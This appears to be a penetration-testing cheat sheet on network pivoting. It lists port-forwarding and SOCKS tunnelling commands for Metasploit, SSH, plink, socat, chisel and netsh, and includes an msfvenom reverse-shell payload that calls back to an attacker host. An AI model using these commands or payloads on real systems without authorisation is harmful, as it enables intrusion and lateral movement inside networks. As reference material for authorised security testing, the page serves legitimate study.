# Pivoting

{% hint style="success" %}
Hack Responsibly.

Always ensure you have **explicit** permission to access any computer system **before** using any of the techniques contained in these documents.  You accept full responsibility for your actions by applying any knowledge gained here. &#x20;
{% endhint %}

## PORT FORWARDING ("port to port")

### Using Metasploit

Target: Most platforms

If you get a meterpreter session on a dual homed machine, or one with multiple network interfaces.

```bash
portfwd add -l 4445 -p 4443 -r 10.1.1.1
# Use -R to make it reverse
```

### Using SSH

Target: Linux

**If you already have an SSH session**

Single host port forward

```bash
ssh -R 8081:172.24.0.2:80 # (on my Kali machine listen on 8081, get it from 172.24.0.2:80)
# <KALI 10.1.1.1>:8081<------------<REMOTE 172.16.0.2>:80
# Now you can access 172.16.0.2:80, which you didn't have direct access to
```

Dual host port forward

```bash
ssh -L 8083:127.0.0.1:8084 # (on your machine listen on 8083, send it to my Kali machine on 8084)
# <KALI 127.0.0.1>:8084<------------<REMOTE 10.1.1.230>:8083<------------<REMOTE X.X.X.X>:XXXX
# run nc on port 8084, and if 10.1.1.230:8083 receives a reverse shell, you will get it on kali

#For reverse shell:
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.123 LPORT=8083 -f exe -o shell
# Run it on 2nd remote target to get a shell on Kali
```

**If you don't already have an SSH session**

First, SSH to your Kali from target machine

On Kali:

```bash
service ssh start 
# "add a user, give it /bin/false in /etc/passwd"
ssh - -R 12345:192.168.1.212:5986 test@10.10.10.123
```

### Using PLINK

Target: Windows&#x20;

service ssh start , and transfer `/usr/share/windows-binaries/plink.exe` to the target machine

```bash
#On Target: 
plink.exe 10.10.10.123 -P 22 -C -N -L 0.0.0.0:4445:10.10.10.123:4443 -l $KALIUSER -pw $PASS
```

### Using SOCAT

Target: Linux

Forward your 8083 to 10.39.0.2:443

```bash
./socat TCP4-LISTEN:8083,fork TCP4:10.39.0.2:443
```

### Using CHISEL

Target: Most platforms

Remote static tunnels "port to port":

```bash
#On Kali "reverse proxy listener":
./chisel server -p 8000 -reverse

#General command:
./chisel client $YOUR_IP:$YOUR_CHISEL_SERVER_PORT L/R:[$YOUR_LOCAL_IP]:$TUNNEL_LISTENING_PORT:$TUNNEL_TARGET:$TUNNEL_PORT
```

**Remote tunnels "access IP:PORT you couldn't access before":**

```bash
#On Target:
./chisel client 10.1.1.1:8000 R:127.0.0.1:8001:172.19.0.3:80
```

**Local tunnels "listen on the target for something, and send it to us":**

```bash
#On Target:
./chisel client 10.1.1.1:8000 9001:127.0.0.1:8003
```

## Using netsh

Target: Windows

```bash
#Add a port forward
netsh interface portproxy add v4tov4 listenaddress=127.0.0.1 listenport=9000 connectaddress=192.168.0.10 connectport=80
#Remove it
netsh interface portproxy delete v4tov4 listenaddress=127.0.0.1 listenport=9000
```

## DYNAMIC Port Forwarding ("one port to any")

* setup proxychains with socks5 on 127.0.0.1:1080
  * Or set up socks5 proxy on firefox
* For nmap use -Pn -sT or use tcp scanner in msf

### Using Metasploit

Target: Most platforms

* If you get a meterpreter session on a dual homed machine, or one with multiple network interfaces.
* Auto route to IP (multi/manage/autoroute)
* Start socks proxy (auxiliary/server/socks4a)

### Using SSH

Target: Linux

```
ssh -i bobs.key -p 2222 bob@10.10.10.123 -D1080
```

### Using PLINK

Target: Windows

```bash
#On Target: 
plink.exe 10.10.10.123 -P 22 -C -N -D 1080 -l $KALIUSER -pw $PASS
```

### Using CHISEL

Target: Most platforms

```bash
#On Kali:
./chisel server -p 8000 -reverse

#On Target:
./chisel client 10.10.10.123:8000 R:8001:127.0.0.1:1080
./chisel server -p 8001 --socks5

#On Kali:
./chisel client 127.0.0.1:8001 socks
```

##
